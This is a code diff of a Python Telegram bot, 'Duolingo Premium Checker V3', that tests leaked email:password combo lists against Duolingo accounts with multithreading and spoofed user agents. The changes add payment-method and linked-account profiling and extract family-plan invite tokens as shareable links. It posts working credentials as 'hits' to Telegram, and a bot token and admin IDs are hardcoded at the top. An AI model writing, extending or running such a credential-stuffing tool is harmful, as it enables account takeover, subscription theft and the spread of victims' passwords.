@@ -14,7 +14,7 @@ BOT_TOKEN = "8689449943:AAHFZdaE4L0TkH6S9BAAtmdWbwoTJYyzcJQ"
 ADMIN_IDS = [8770379893, 1859432548]
 MAX_THREADS = 50
 BATCH_SIZE = 10000
-PROGRESS_INTERVAL = 1000  # 1000 combos per update
+PROGRESS_INTERVAL = 1000
 # ===================================
 
 logging.basicConfig(format='%(asctime)s - %(message)s', level=logging.INFO, datefmt='%H:%M:%S')
@@ -38,7 +38,7 @@ family_count = 0
 free_count = 0
 fail_count = 0
 
-# Batch stats for "Last 1000"
+# Batch stats
 last_batch_super = 0
 last_batch_family = 0
 last_batch_free = 0
@@ -67,14 +67,22 @@ def generate_ua():
     models = ["SM-G991B", "Pixel 6", "OnePlus 9", "Xiaomi Mi 11", "Pixel 7 Pro"]
     return f"Dalvik/2.1.0 (Linux; U; Android {versions[hash(str(time.time())) % len(versions)]}; {models[hash(str(time.time())) % len(models)]} Build/RP1A.200720.012)"
 
-# ========== FIXED: PAYMENT METHOD DETECTION ==========
+# ========== PAYMENT METHOD DETECTION ==========
 def detect_payment_method(data):
-    """Detect payment method from subscription data - FIXED VERSION"""
+    """Detect payment method - Credit Card vs Google Play vs Apple App Store"""
     
-    # Method 1: Check subscription object directly (current API)
     subscription = data.get("subscription", {})
+    shop_items = data.get("shopItems", [])
+    
+    # Check for trial
+    for item in shop_items:
+        sub_info = item.get("subscriptionInfo", {})
+        sku = sub_info.get("productId", "").lower()
+        if "trial" in sku or "free" in sku:
+            return "Free Trial 🎁"
+    
+    # Check payment processor
     if subscription:
-        # Check billing info
         billing_info = subscription.get("billingInfo", {})
         if billing_info:
             processor = billing_info.get("paymentProcessor", "").lower()
@@ -84,67 +92,67 @@ def detect_payment_method(data):
                 return "Apple App Store 🍎"
             elif "paypal" in processor:
                 return "PayPal 💙"
-        
-        # Check product ID
-        product_id = subscription.get("productId", "")
-        if "google" in product_id.lower():
-            return "Google Play 🟢"
-        elif "apple" in product_id.lower() or "ios" in product_id.lower():
-            return "Apple App Store 🍎"
-        elif "paypal" in product_id.lower():
-            return "PayPal 💙"
+            elif "stripe" in processor or "braintree" in processor:
+                return "Credit Card 💳 (Direct)"
     
-    # Method 2: Check shopItems
-    shop_items = data.get("shopItems", [])
+    # Check purchase platform
+    if subscription:
+        platform = subscription.get("purchasePlatform", "")
+        platform_lower = platform.lower()
+        if "google" in platform_lower:
+            return "Google Play 🟢"
+        elif "apple" in platform_lower or "ios" in platform_lower:
+            return "Apple App Store 🍎"
+        elif "web" in platform_lower:
+            return "Credit Card 💳 (Direct)"
+    
+    # Check product ID
+    product_id = ""
+    if subscription:
+        product_id = subscription.get("productId", "")
+    
     for item in shop_items:
         sub_info = item.get("subscriptionInfo", {})
-        if sub_info:
-            # Check receipt
-            receipt = sub_info.get("receipt", {})
-            if receipt:
-                receipt_str = str(receipt).lower()
-                if "google" in receipt_str:
-                    return "Google Play 🟢"
-                elif "apple" in receipt_str or "itunes" in receipt_str:
-                    return "Apple App Store 🍎"
-            
-            # Check SKU
-            sku = sub_info.get("productId", "").lower()
-            if "google" in sku:
-                return "Google Play 🟢"
-            elif "apple" in sku or "ios" in sku:
-                return "Apple App Store 🍎"
-        
-        # Check transaction ID
-        if "originalTransactionId" in str(item):
-            transaction = str(item.get("originalTransactionId", "")).lower()
-            if "google" in transaction:
-                return "Google Play 🟢"
-            elif "apple" in transaction:
-                return "Apple App Store 🍎"
+        if sub_info.get("productId"):
+            product_id = sub_info.get("productId", "")
     
-    # Method 3: Raw JSON search
-    data_str = str(data).lower()
-    if "google play" in data_str or ("android" in data_str and "purchase" in data_str):
+    product_lower = product_id.lower()
+    
+    if "google" in product_lower or "android" in product_lower:
         return "Google Play 🟢"
-    elif "apple" in data_str and ("store" in data_str or "itunes" in data_str):
+    elif "apple" in product_lower or "ios" in product_lower or "itunes" in product_lower:
         return "Apple App Store 🍎"
-    elif "paypal" in data_str:
-        return "PayPal 💙"
+    elif "web" in product_lower or "direct" in product_lower:
+        return "Credit Card 💳 (Direct)"
     
-    # Method 4: Check if it's premium but no method found
+    # Check receipt data
+    for item in shop_items:
+        sub_info = item.get("subscriptionInfo", {})
+        receipt = sub_info.get("receipt", {})
+        if receipt:
+            receipt_str = str(receipt).lower()
+            if "google" in receipt_str:
+                return "Google Play 🟢"
+            elif "apple" in receipt_str or "itunes" in receipt_str:
+                return "Apple App Store 🍎"
+    
+    # Check for family plan
+    for item in shop_items:
+        family_info = item.get("familyPlanInfo", {})
+        if family_info and family_info.get("inviteToken"):
+            return "Family Plan 👨‍👩‍👧"
+    
+    # Default for premium accounts
     if data.get("hasPlus") or data.get("has_item_premium_subscription"):
-        if "free" not in data_str and "trial" not in data_str:
-            return "Web Purchase 🌐"
+        return "Premium Account 💎"
     
     return "Unknown 💳"
 
-# ========== FIXED: SOCIAL LINKS DETECTION ==========
+# ========== SOCIAL LINKS DETECTION ==========
 def detect_social_links(data):
-    """Detect linked social accounts - IMPROVED VERSION"""
+    """Detect linked social accounts"""
     social_links = []
     
-    # Check linkedAccounts array
     linked_accounts = data.get("linkedAccounts", [])
     for account in linked_accounts:
         provider = account.get("provider", "").lower()
@@ -155,31 +163,14 @@ def detect_social_links(data):
         elif "apple" in provider:
             social_links.append("Apple ID 🍎")
     
-    # Check boolean flags
-    if data.get("hasFacebookId"):
-        if "Facebook 🔵" not in social_links:
-            social_links.append("Facebook 🔵")
-    if data.get("hasGoogleId"):
-        if "Google 🔴" not in social_links:
-            social_links.append("Google 🔴")
-    
-    # Check user profile for social info
-    profile = data.get("profile", {})
-    if profile:
-        if profile.get("facebookId"):
-            if "Facebook 🔵" not in social_links:
-                social_links.append("Facebook 🔵")
-        if profile.get("googleId"):
-            if "Google 🔴" not in social_links:
-                social_links.append("Google 🔴")
-    
-    # Check for email (always counts as contact method)
-    if data.get("email"):
-        pass  # Don't add as social
+    if data.get("hasFacebookId") and "Facebook 🔵" not in social_links:
+        social_links.append("Facebook 🔵")
+    if data.get("hasGoogleId") and "Google 🔴" not in social_links:
+        social_links.append("Google 🔴")
     
     return social_links if social_links else ["None ❌"]
 
-# ========== FIXED: SUBSCRIPTION DETAILS ==========
+# ========== SUBSCRIPTION DETAILS ==========
 def extract_subscription_details(data):
     details = {
         "product_id": "Unknown",
@@ -190,7 +181,7 @@ def extract_subscription_details(data):
         "billing_cycle": "Unknown"
     }
     
-    # NEW: Check subscription object directly (current API structure)
+    # Check subscription object
     subscription = data.get("subscription", {})
     if subscription:
         if subscription.get("productId"):
@@ -199,58 +190,53 @@ def extract_subscription_details(data):
             details["renewing"] = "Yes ✅" if subscription.get("renewing") else "No ❌"
         if subscription.get("expirationTime"):
             expiry_ms = subscription.get("expirationTime")
-            details["expiry"] = datetime.fromtimestamp(expiry_ms / 1000).strftime("%Y-%m-%d")
+            if expiry_ms and expiry_ms > 1000000000000:
+                details["expiry"] = datetime.fromtimestamp(expiry_ms / 1000).strftime("%Y-%m-%d")
         elif subscription.get("expectedExpiration"):
             expiry_ms = subscription.get("expectedExpiration")
-            details["expiry"] = datetime.fromtimestamp(expiry_ms / 1000).strftime("%Y-%m-%d")
+            if expiry_ms and expiry_ms > 1000000000000:
+                details["expiry"] = datetime.fromtimestamp(expiry_ms / 1000).strftime("%Y-%m-%d")
         if subscription.get("billingPeriod"):
             period = subscription.get("billingPeriod", "").lower()
             if "month" in period:
                 details["billing_cycle"] = "Monthly 📅"
             elif "year" in period:
                 details["billing_cycle"] = "Yearly 📆"
-            elif "week" in period:
-                details["billing_cycle"] = "Weekly 📅"
     
-    # Original shopItems check (backward compatibility)
+    # Check shopItems
     shop_items = data.get("shopItems", [])
     for item in shop_items:
         sub_info = item.get("subscriptionInfo", {})
         if sub_info:
-            if not details["product_id"] or details["product_id"] == "Unknown":
-                if sub_info.get("productId"):
-                    details["product_id"] = sub_info.get("productId")
-                    # Detect billing cycle from product ID
-                    pid = sub_info.get("productId", "").lower()
-                    if details["billing_cycle"] == "Unknown":
-                        if "monthly" in pid or "month" in pid:
-                            details["billing_cycle"] = "Monthly 📅"
-                        elif "yearly" in pid or "annual" in pid or "year" in pid:
-                            details["billing_cycle"] = "Yearly 📆"
-                        elif "weekly" in pid or "week" in pid:
-                            details["billing_cycle"] = "Weekly 📅"
+            if details["product_id"] == "Unknown" and sub_info.get("productId"):
+                details["product_id"] = sub_info.get("productId")
             if details["renewing"] == "Unknown" and sub_info.get("renewing") is not None:
                 details["renewing"] = "Yes ✅" if sub_info.get("renewing") else "No ❌"
             if details["expiry"] == "Unknown" and sub_info.get("expectedExpiration"):
                 expiry_ms = sub_info.get("expectedExpiration")
-                details["expiry"] = datetime.fromtimestamp(expiry_ms / 1000).strftime("%Y-%m-%d")
+                if expiry_ms and expiry_ms > 1000000000000:
+                    details["expiry"] = datetime.fromtimestamp(expiry_ms / 1000).strftime("%Y-%m-%d")
         
+        # CRITICAL: Extract family plan invite token
         family_info = item.get("familyPlanInfo", {})
         if family_info and family_info.get("inviteToken"):
             details["invite_token"] = family_info.get("inviteToken")
     
-    # Detect payment method (using updated function)
+    # Detect payment method
     details["payment_method"] = detect_payment_method(data)
     
     return details
 
 def is_premium_account(data):
     shop_items = data.get("shopItems", [])
+    
+    # Check for family plan first
     for item in shop_items:
         family_info = item.get("familyPlanInfo", {})
         if family_info and family_info.get("inviteToken"):
             return True, "FAMILY", family_info.get("inviteToken")
     
+    # Check for subscription
     for item in shop_items:
         sub_info = item.get("subscriptionInfo", {})
         if sub_info:
@@ -260,7 +246,7 @@ def is_premium_account(data):
             if product_id and product_id != "N/A":
                 return True, "SUPER", None
     
-    # Check subscription object directly
+    # Check subscription object
     subscription = data.get("subscription", {})
     if subscription:
         if subscription.get("productId") and "trial" not in subscription.get("productId", "").lower():
@@ -344,7 +330,7 @@ def check_single_account(email, password):
         
         is_premium, plan_type, invite_token = is_premium_account(data)
         
-        # Get social links (IMPROVED)
+        # Get social links
         social_links = detect_social_links(data)
         social_text = ", ".join(social_links)
         
@@ -352,10 +338,12 @@ def check_single_account(email, password):
             return email, password, "FREE", f"{username}|XP:{total_xp}|Streak:{streak}", None
         
         sub_details = extract_subscription_details(data)
+        
+        # Use invite token from detection if available
         if invite_token:
             sub_details["invite_token"] = invite_token
         
-        # Compact but detailed format
+        # Format output based on plan type
         if plan_type == "FAMILY":
             result = f"""
 ╔══════════════════════════════════════╗
@@ -377,9 +365,15 @@ def check_single_account(email, password):
 ├──────────────────────────────────────┤
 │  🔗 Social: {social_text}
 └──────────────────────────────────────┘"""
+            
+            # ADD INVITE LINK FOR FAMILY PLAN
             if sub_details["invite_token"]:
-                result += f"\n🔗 Invite: `https://www.duolingo.com/family-plan?invite={sub_details['invite_token']}`"
-        else:
+                invite_link = f"https://www.duolingo.com/family-plan?invite={sub_details['invite_token']}"
+                result += f"\n\n🔗 **FAMILY PLAN INVITE LINK:**\n`{invite_link}`"
+            else:
+                result += f"\n\n⚠️ No invite token found for this family plan."
+        
+        else:  # SUPER plan
             result = f"""
 ╔══════════════════════════════════════╗
 ║    🎉 PREMIUM SUPER PLAN FOUND 🎉    ║
@@ -401,7 +395,7 @@ def check_single_account(email, password):
 │  🔗 Social: {social_text}
 └──────────────────────────────────────┘"""
         
-        result += f"\n\n🦉 Checked by: DUOLINGO CHECKER"
+        result += f"\n\n🦉 Checked by: THUYA"
         
         return email, password, "HIT", result, plan_type
         
@@ -412,14 +406,13 @@ def send_main_menu(chat_id):
     global super_count, family_count
     
     total_hits = len(all_super_hits) + len(all_family_hits)
-    today_hits = super_count + family_count
     
     admin_name = "thuyaaungzaw"
     
     menu_text = f"""
 ╔══════════════════════════════════════╗
 ║        🦉 DUOLINGO CHECKER V3        ║
-║         Thu Ya Aung Zaw      ║
+║         Thu Ya Aung Zaw              ║
 ╚══════════════════════════════════════╝
 
 ┌──────────────────────────────────────┐
@@ -493,6 +486,7 @@ def send_hits_list(chat_id, page=0):
         streak = "0"
         expiry = "Unknown"
         payment = "Unknown"
+        invite_link = ""
         for line in lines:
             if '👤' in line and '│' in line:
                 parts = line.split('│')
@@ -507,7 +501,9 @@ def send_hits_list(chat_id, page=0):
                 expiry = line.split('⏰ Expires:')[1].strip()
             if '💳' in line:
                 payment = line.split('💳')[1].strip()
-        all_hits.append(("👨‍👩‍👧 FAMILY", email, pwd, username, xp, streak, expiry, payment))
+            if 'invite' in line:
+                invite_link = line.strip()
+        all_hits.append(("👨‍👩‍👧 FAMILY", email, pwd, username, xp, streak, expiry, payment, invite_link))
     
     total_pages = (len(all_hits) + hits_per_page - 1) // hits_per_page
     if page >= total_pages:
@@ -519,13 +515,26 @@ def send_hits_list(chat_id, page=0):
     end = min(start + hits_per_page, len(all_hits))
     
     hit_list_text = ""
-    for i, (plan, email, pwd, username, xp, streak, expiry, payment) in enumerate(all_hits[start:end], start=start+1):
-        hit_list_text += f"""┌─[{i}] {plan}
+    for item in all_hits[start:end]:
+        if len(item) == 8:  # SUPER
+            plan, email, pwd, username, xp, streak, expiry, payment = item
+            hit_list_text += f"""┌─[{all_hits.index(item)+1}] {plan}
 ├ 📧 `{email}:{pwd}`
 ├ 👤 {username[:20]}
 ├ ⭐ {xp} XP │ 🔥 {streak}d
 ├ 💳 {payment[:15]}
 └ ⏰ {expiry[:10]}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+"""
+        else:  # FAMILY with invite
+            plan, email, pwd, username, xp, streak, expiry, payment, invite = item
+            hit_list_text += f"""┌─[{all_hits.index(item)+1}] {plan}
+├ 📧 `{email}:{pwd}`
+├ 👤 {username[:20]}
+├ ⭐ {xp} XP │ 🔥 {streak}d
+├ 💳 {payment[:15]}
+├ ⏰ {expiry[:10]}
+└ 🔗 Invite Link Included
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 """
     
@@ -538,7 +547,7 @@ def send_hits_list(chat_id, page=0):
 📄 Page {page+1}/{total_pages}
 
 {hit_list_text}
-💡 Click COPY ALL to get full details
+💡 Click COPY ALL to get full details (including invite links)
 """
     
     markup = InlineKeyboardMarkup(row_width=3)
@@ -677,7 +686,7 @@ def callback_handler(call):
         for email, pwd, result in all_super_hits:
             all_hits_text += f"👑 SUPER\n📧 {email}:{pwd}\n{'-'*30}\n"
         for email, pwd, result in all_family_hits:
-            all_hits_text += f"👨‍👩‍👧 FAMILY\n📧 {email}:{pwd}\n{'-'*30}\n"
+            all_hits_text += f"👨‍👩‍👧 FAMILY\n📧 {email}:{pwd}\n{result}\n{'-'*30}\n"
         
         if all_hits_text:
             if len(all_hits_text) > 4000:
@@ -753,7 +762,7 @@ def process_combos(chat_id, combos):
                     last_batch_super += 1
                     all_super_hits.append((email, password, detail))
                 bot.send_message(chat_id, detail, parse_mode='Markdown')
-                logging.info(f"✅ HIT: {email}")
+                logging.info(f"✅ HIT: {email} ({plan_type})")
             elif status == "FREE":
                 free_count += 1
                 last_batch_free += 1
@@ -896,6 +905,6 @@ print("🤖 Duolingo Premium Checker V3")
 print("═" * 50)
 print(f"  Admin: {ADMIN_IDS}")
 print(f"  Threads: {MAX_THREADS}")
-print(f"  Features: Payment Detection | Social Links | Compact UI")
+print(f"  Features: Payment Detection | Social Links | Family Plan Invite Links")
 print("═" * 50)
 bot.infinity_polling()
